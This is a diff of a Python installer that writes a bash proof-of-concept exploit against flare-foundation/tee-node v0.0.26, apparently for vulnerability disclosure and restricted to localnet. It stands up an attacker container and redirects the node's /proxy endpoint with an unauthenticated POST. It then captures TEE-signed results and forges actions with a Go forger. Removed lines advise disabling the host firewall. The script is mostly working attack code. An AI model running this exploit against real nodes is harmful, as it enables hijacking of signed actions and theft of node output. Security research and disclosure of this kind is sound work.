@@ -1,19 +1,16 @@
 #!/usr/bin/env python3
-# tee-node PoC installer (rev 4) - adds --hostnet mode for hosts where
-# inter-container bridge traffic is firewalled.
-import hashlib, os, sys
+# tee-node PoC installer (rev 5) - computed-indentation compose generation,
+# post-generation validation, helper-order fix, color typo fix.
+import hashlib, os, re, sys
 
 POC = r"""#!/usr/bin/env bash
 # ============================================================================
-# ONE-SHOT PoC rev 4 - flare-foundation/tee-node @ v0.0.26
-#
-# rev 4: --hostnet mode (all services share the host network namespace,
-#        all communication via 127.0.0.1 - bypasses docker bridge entirely
-#        for hosts that drop inter-container traffic). Bridge mode remains
-#        the default and the preferred demonstration mode.
-#
-# Usage:   ./poc.sh [--quick] [--keep] [--hostnet]
-# Env:     TEE_NODE_SRC=<path>  use a local clone instead of fetching v0.0.26
+# ONE-SHOT PoC rev 5 - flare-foundation/tee-node @ v0.0.26
+# rev 5: compose generated with COMPUTED indentation (printf) + validated
+#        immediately (docker compose config -q); helper definitions moved
+#        before first use; color escape typo fixed.
+# Usage: ./poc.sh [--quick] [--keep] [--hostnet]
+# Env:   TEE_NODE_SRC=<path>  use a local clone instead of fetching v0.0.26
 # Localnet only. Run solely against instances you own.
 # ============================================================================
 set -uo pipefail
@@ -34,7 +31,7 @@ for a in "$@"; do
   esac
 done
 
-# ---- network targets (mode-dependent) -------------------------------------
+# ---- network targets (mode-dependent) --------------------------------------
 if [ "$HOSTNET" = "1" ]; then
   PROXY_TARGET="http://127.0.0.1:8080"
   LEGIT_URL="http://127.0.0.1:8080"
@@ -47,30 +44,13 @@ else
   NODE_URL="http://tee-node:5500"
 fi
 
-# ---------------------------------------------------------------- preflight
-command -v git >/dev/null || { echo "git required"; exit 1; }
-docker compose version >/dev/null 2>&1 || { echo "docker compose v2 required"; exit 1; }
-docker compose -p tee-node-poc down -v >/dev/null 2>&1 || true
-
-if [ "$HOSTNET" = "1" ]; then
-  info "host-network mode: services share the host netns (127.0.0.1)"
-  if command -v ss >/dev/null 2>&1 || command -v netstat >/dev/null 2>&1; then
-    for p in 5500 8080 9000; do
-      if (ss -ltn 2>/dev/null || netstat -ltn 2>/dev/null) | grep -qE "[:.]$p[[:space:]]"; then
-        echo "port $p already in use on this host - free it before --hostnet mode"; exit 1
-      fi
-    done
-  else
-    echo "ss/netstat not found - port preflight skipped"
-  fi
-fi
-
 TS=$(date +%Y%m%d-%H%M%S)
 WS="$PWD/.poc-ws-$TS"; mkdir -p "$WS"
 EV="$PWD/poc-evidence-$TS"; mkdir -p "$EV/forger"
 FAILED=0; FORGER_BUILT=0; LEGIT_TEEID=""
 
-C='\033[1;34m'; G='\033[1;32m'; R='\033[1;31m'; Y='\033[1;33y'; N='\033[0m'
+# ---- output helpers (defined BEFORE first use) ------------------------------
+C='\033[1;34m'; G='\033[1;32m'; R='\033[1;31m'; Y='\033[1;33m'; N='\033[0m'
 phase(){ echo -e "\n${C}======== $1 ========${N}"; }
 ok(){   local l="[PASS] $1"; echo -e "${G}${l}${N}"; echo "$l" >> "$EV/SUMMARY.txt"; }
 info(){ echo -e "${Y}[INFO]${N} $1"; }
@@ -85,6 +65,49 @@ cleanup(){
   fi
 }
 trap cleanup EXIT
+
+dc(){ docker compose -f "$WS/docker-compose.yml" "$@"; }
+nc(){ dc exec -T attacker curl -sS --noproxy '*' --max-time 5 "$@"; }
+jqf(){ dc exec -T attacker jq -r "$@"; }
+
+forge(){
+  local cap=""
+  [ -n "${CAPTURE:-}" ] && cap="/ws/$(basename "$CAPTURE")"
+  docker run --rm -v "$WS:/ws" \
+    -e POC_FORGER_CMD="$1" -e POC_FORGER_OUT=/ws/out.json -e POC_FORGER_KEYS=/ws/keys \
+    -e POC_FORGER_TEEID="${TEEID:-}" -e POC_FORGER_CAPTURE="$cap" \
+    -e POC_FORGER_GOVADDR="$GOVADDR" \
+    golang:1.25 /ws/forger.test -test.run TestPocForger -test.count=1 -test.v
+}
+push_action(){ nc -X POST $ATTACKER_URL/actions -H 'Content-Type: application/json' --data-binary @- < "$WS/out.json" >/dev/null; }
+push_legit(){  nc -X POST $LEGIT_URL/actions -H 'Content-Type: application/json' --data-binary @- < "$WS/out.json" >/dev/null; }
+wait_count(){
+  local url=$1 prev=$2 field=$3 to=${4:-20} i c
+  for i in $(seq 1 $((to*2))); do
+    c=$(nc "$url/stats" | jqf ".$field" 2>/dev/null) || c=0
+    [ "${c:-0}" -gt "$prev" ] && { echo "$c"; return 0; }
+    sleep 0.5
+  done; echo "$prev"; return 1; }
+body_at(){ nc $ATTACKER_URL/received | jqf ".[$1]"; }
+
+# ---------------------------------------------------------------- preflight
+command -v git >/dev/null || { echo "git required"; exit 1; }
+docker compose version >/dev/null 2>&1 || { echo "docker compose v2 required"; exit 1; }
+docker compose -p tee-node-poc down -v >/dev/null 2>&1 || true
+
+if [ "$HOSTNET" = "1" ]; then
+  info "host-network mode: services share one netns (127.0.0.1)"
+  if command -v ss >/dev/null 2>&1 || command -v netstat >/dev/null 2>&1; then
+    for p in 5500 8080 9000; do
+      if (ss -ltn 2>/dev/null || netstat -ltn 2>/dev/null) | grep -qE "[:.]$p[[:space:]]"; then
+        echo "port $p already in use - free it before --hostnet mode"; exit 1
+      fi
+    done
+  else
+    info "ss/netstat not found - port preflight skipped"
+  fi
+fi
+
 echo "workspace: $WS"; echo "evidence:  $EV"
 echo "netmode:   $([ "$HOSTNET" = "1" ] && echo host || echo bridge)"
 
@@ -444,50 +467,61 @@ CMD ["python3", "/srv/server.py"]
 EOF
 
 # ------------------------------------------------- compose -----------------
+# rev 5: ALL indentation is COMPUTED (printf) - immune to whitespace slips -
+# and the file is validated immediately after generation.
 write_compose(){ # $1=image|build  $2=host|bridge
-  local top netline footer
+  local i2 i4 i6 i8 top netline footer
+  i2=$(printf '%2s' ''); i4=$(printf '%4s' ''); i6=$(printf '%6s' ''); i8=$(printf '%8s' '')
   if [ "$1" = "image" ]; then
-    top="    image: $NODE_IMAGE"
+    top="${i4}image: $NODE_IMAGE"
   else
-    top="    build:
-      context: ./repo
-      args:
-        SOURCE_DATE_EPOCH: \"$SDE\""
+    top="${i4}build:
+ ${i6}context: ./repo
+ ${i6}args:
+ ${i8}SOURCE_DATE_EPOCH: \"$SDE\""
   fi
   if [ "$2" = "host" ]; then
-    netline="    network_mode: host"
+    netline="${i4}network_mode: host"
     footer=""
   else
-    netline="    networks: [pocnet]"
+    netline="${i4}networks: [pocnet]"
     footer="
 networks:
-  pocnet:
-    driver: bridge"
+ ${i2}pocnet:
+ ${i4}driver: bridge"
   fi
-  cat > "$WS/docker-compose.yml" <<EOF
-name: tee-node-poc
-services:
-  tee-node:
- $top
-    environment:
-      MODE: "1"
-      LOG_LEVEL: "INFO"
-      PROXY_URL: $PROXY_TARGET
-      CHAIN_ID: "$CHAIN_ID"
-      HTTP_PROXY: ""
-      HTTPS_PROXY: ""
-      http_proxy: ""
-      https_proxy: ""
-      NO_PROXY: "*"
-      no_proxy: "*"
- $netline
-  legit-proxy:
-    build: ./legit
- $netline
-  attacker:
-    build: ./attacker
- $netline$footer
-EOF
+  {
+    echo "name: tee-node-poc"
+    echo "services:"
+    echo "${i2}tee-node:"
+    echo "$top"
+    echo "${i4}environment:"
+    echo "${i6}MODE: \"1\""
+    echo "${i6}LOG_LEVEL: \"INFO\""
+    echo "${i6}PROXY_URL: $PROXY_TARGET"
+    echo "${i6}CHAIN_ID: \"$CHAIN_ID\""
+    echo "${i6}HTTP_PROXY: \"\""
+    echo "${i6}HTTPS_PROXY: \"\""
+    echo "${i6}http_proxy: \"\""
+    echo "${i6}https_proxy: \"\""
+    echo "${i6}NO_PROXY: \"*\""
+    echo "${i6}no_proxy: \"*\""
+    echo "$netline"
+    echo "${i2}legit-proxy:"
+    echo "${i4}build: ./legit"
+    echo "$netline"
+    echo "${i2}attacker:"
+    echo "${i4}build: ./attacker"
+    echo "$netline$footer"
+  } > "$WS/docker-compose.yml"
+  if ! docker compose -f "$WS/docker-compose.yml" config -q >/dev/null 2>"$WS/compose-check.err"; then
+    echo "FATAL: generated docker-compose.yml failed validation:"
+    cat "$WS/compose-check.err"
+    echo "---- generated file (cat -A: ^I = tab, \$ = line end) ----"
+    cat -A "$WS/docker-compose.yml"
+    exit 1
+  fi
+  info "compose file generated and validated ($1 / $2)"
 }
 
 SDE=$(git -C "$WS/repo" log -1 --format=%ct)
@@ -498,30 +532,6 @@ else
 fi
 [ "$HOSTNET" = "1" ] && NETMODE=host || NETMODE=bridge
 write_compose "$SRCMODE" "$NETMODE"
-
-dc(){ docker compose -f "$WS/docker-compose.yml" "$@"; }
-nc(){ dc exec -T attacker curl -sS --noproxy '*' --max-time 5 "$@"; }
-jqf(){ dc exec -T attacker jq -r "$@"; }
-
-forge(){
-  local cap=""
-  [ -n "${CAPTURE:-}" ] && cap="/ws/$(basename "$CAPTURE")"
-  docker run --rm -v "$WS:/ws" \
-    -e POC_FORGER_CMD="$1" -e POC_FORGER_OUT=/ws/out.json -e POC_FORGER_KEYS=/ws/keys \
-    -e POC_FORGER_TEEID="${TEEID:-}" -e POC_FORGER_CAPTURE="$cap" \
-    -e POC_FORGER_GOVADDR="$GOVADDR" \
-    golang:1.25 /ws/forger.test -test.run TestPocForger -test.count=1 -test.v
-}
-push_action(){ nc -X POST $ATTACKER_URL/actions -H 'Content-Type: application/json' --data-binary @- < "$WS/out.json" >/dev/null; }
-push_legit(){  nc -X POST $LEGIT_URL/actions -H 'Content-Type: application/json' --data-binary @- < "$WS/out.json" >/dev/null; }
-wait_count(){
-  local url=$1 prev=$2 field=$3 to=${4:-20} i c
-  for i in $(seq 1 $((to*2))); do
-    c=$(nc "$url/stats" | jqf ".$field" 2>/dev/null) || c=0
-    [ "${c:-0}" -gt "$prev" ] && { echo "$c"; return 0; }
-    sleep 0.5
-  done; echo "$prev"; return 1; }
-body_at(){ nc $ATTACKER_URL/received | jqf ".[$1]"; }
 
 # ------------------------------------------- background forger build -------
 FORGER_PID=""
@@ -548,25 +558,18 @@ if ! dc exec -T attacker curl -sS --noproxy '*' -m 5 \
   echo "[compose ps]"; dc ps 2>&1 | sed 's/^/  /'
   echo "[proxy env inside attacker container]"
   dc exec -T attacker sh -c 'env | grep -i proxy' 2>&1 | sed 's/^/  /' || true
-  echo "[host docker daemon/client proxy config]"
-  docker info 2>/dev/null | grep -i proxy | sed 's/^/  /' || echo "  (none)"
+  echo "[host docker daemon proxy config (userland lines excluded)]"
+  docker info 2>/dev/null | grep -i proxy | grep -viE 'userland|userns' | sed 's/^/  /' || echo "  (none)"
   if [ "$HOSTNET" != "1" ]; then
     echo "[DNS: legit-proxy from attacker]"
     dc exec -T attacker sh -c 'getent hosts legit-proxy' 2>&1 | sed 's/^/  /' || true
   fi
   echo ""
   if [ "$HOSTNET" = "1" ]; then
-    echo "hostnet mode: a failure here means a port conflict or a crashed server -"
-    echo "check 'dc ps' above and: docker compose -f $WS/docker-compose.yml logs legit-proxy"
+    echo "hostnet mode: a failure here means a port conflict or a crashed server:"
+    echo "  docker compose -f $WS/docker-compose.yml logs legit-proxy"
   else
-    echo "Interpretation:"
-    echo "  1. 'docker info' shows a proxy => host proxy config leaks into containers."
-    echo "  2. compose ps shows tee-node missing/exited => report:"
-    echo "       docker compose -f $WS/docker-compose.yml logs tee-node | tail -50"
-    echo "  3. Everything green but still timing out => host firewall drops"
-    echo "     inter-container traffic. Confirm: sudo systemctl stop firewalld"
-    echo "     (or sudo ufw disable), re-run, re-enable afterwards."
-    echo "     Or bypass entirely: ./poc.sh --keep --quick --hostnet"
+    echo "bridge mode failure: see diag guidance or retry with --hostnet"
   fi
   exit 1
 fi
@@ -622,13 +625,14 @@ fi
 # ============================================================ PHASE 1 ======
 phase "PHASE 1 - Attack surface (reconnaissance)"
 CODE=$(nc -o /dev/null -w '%{http_code}' $NODE_URL/ 2>/dev/null)
-[ "${CODE:-000}" != "000" ] || fail ":5500 unreachable"
 if [ "${CODE:-000}" != "000" ]; then
   if [ "$HOSTNET" = "1" ]; then
-    ok ":5500 reachable from an unrelated process (hostnet mode; all-interfaces bind live. Loopback contrast is code-level here: SignHost is hardcoded 127.0.0.1 in internal/settings)"
+    ok ":5500 reachable from an unrelated process (hostnet mode; all-interfaces bind live. Loopback contrast is code-level here: SignHost is hardcoded 127.0.0.1)"
   else
     ok ":5500 reachable CROSS-CONTAINER (all-interfaces bind; a SignHost-style loopback binding would refuse)"
   fi
+else
+  fail ":5500 unreachable"
 fi
 CODE8=$(nc -o /dev/null -w '%{http_code}' http://127.0.0.1:8888/ 2>/dev/null)
 [ "${CODE8:-000}" = "000" ] \
@@ -665,12 +669,12 @@ SG=$(nc $ATTACKER_URL/stats | jqf .signed_results)
 [ "${SG:-0}" -ge 3 ] && ok "TEE-SIGNED results exfiltrated to attacker: ${SG} (ECDSA by the node key)" \
                      || fail "no signed results (${SG:-0})"
 nc $ATTACKER_URL/received | jqf '.[-1]' > "$EV/02-sample-signed-result.json"
-echo "— sample captured ActionResponse:"; head -c 300 "$EV/02-sample-signed-result.json"; echo
+echo "- sample captured ActionResponse:"; head -c 300 "$EV/02-sample-signed-result.json"; echo
 dc logs tee-node 2>/dev/null | grep -m2 "error getting action" \
   && info "node error logs confirm failing fetches against the hijacked endpoint" || true
 CODE=$(nc -o /dev/null -w '%{http_code}' -X POST "$NODE_URL/chain-id" \
   -H 'Content-Type: application/json' -d "{\"chainId\":$CHAIN_ID}")
-[ "$CODE" = "403" ] && ok "CONTRAST: /chain-id (env-provisioned) REFUSES the attacker ($CODE) - while /proxy, equally env-provisioned, fell to one POST: the documented 'deploy-time env closes the window' mitigation holds ONLY for set-once endpoints" \
+[ "$CODE" = "403" ] && ok "CONTRAST: /chain-id (env-provisioned) REFUSES the attacker ($CODE) - while /proxy, equally env-provisioned, fell to one POST: the documented mitigation holds ONLY for set-once endpoints" \
                     || info "/chain-id answered $CODE (expected 403 when env-provisioned)"
 nc -X POST $ATTACKER_URL/mode -H 'Content-Type: application/json' -d '{"mode":"observe"}' >/dev/null
 
@@ -706,7 +710,7 @@ else
     TEEID=$(cat "$WS/out.json")
     ok "D1 - node identity via zero-auth direct action: $TEEID (TEE signature on the response verified)"
     if [ -n "$LEGIT_TEEID" ] && [ "$LEGIT_TEEID" = "$TEEID" ]; then
-      ok "D1 - pre-attack (Phase 0b) and post-attack responses carry the SAME node identity: the hijacked node IS the node that was serving the legitimate flow"
+      ok "D1 - pre-attack and post-attack responses carry the SAME node identity: the hijacked node IS the node that was serving the legitimate flow"
     fi
     if forge governance-hash >/dev/null; then
       GH=$(cat "$WS/out.json")
@@ -802,6 +806,9 @@ MARKERS = (
     "write_compose",
     "network_mode: host",
     "HOSTNET",
+    "config -q",
+    "printf '%4s'",
+    "Y='\\033[1;33m'",
 )
 
 def main():
@@ -810,18 +817,22 @@ def main():
         sys.exit("payload corrupted - missing markers: %r" % (missing,))
     if "\r" in POC:
         sys.exit("payload corrupted - CRLF detected")
+    # regression guard for the rev-4 bug class: heredoc/echo variable lines
+    # carrying leading whitespace would mis-indent the generated compose file
+    if re.search(r'^[ \t]+\$(top|netline)\b', POC, re.M):
+        sys.exit("payload corrupted: $top/$netline line has leading whitespace (rev-4 bug class)")
     poc = POC if POC.endswith("\n") else POC + "\n"
     with open("poc.sh", "w", encoding="utf-8", newline="\n") as f:
         f.write(poc)
     os.chmod("poc.sh", 0o755)
     data = poc.encode("utf-8")
-    print("written : poc.sh (executable, rev 4)")
+    print("written : poc.sh (executable, rev 5)")
     print("lines   : %d" % poc.count("\n"))
     print("bytes   : %d" % len(data))
     print("sha256  : %s" % hashlib.sha256(data).hexdigest())
     print()
-    print("next    : ./poc.sh --keep --quick --hostnet   (bypasses bridge firewall)")
-    print("         ./poc.sh --keep --quick             (bridge mode - needs host to allow it)")
+    print("next    : ./poc.sh --keep --quick --hostnet   (Codespaces / firewalled hosts)")
+    print("         ./poc.sh --keep --quick             (bridge mode)")
     print("         ./poc.sh --keep --hostnet           (full run incl. forger)")
 
 main()
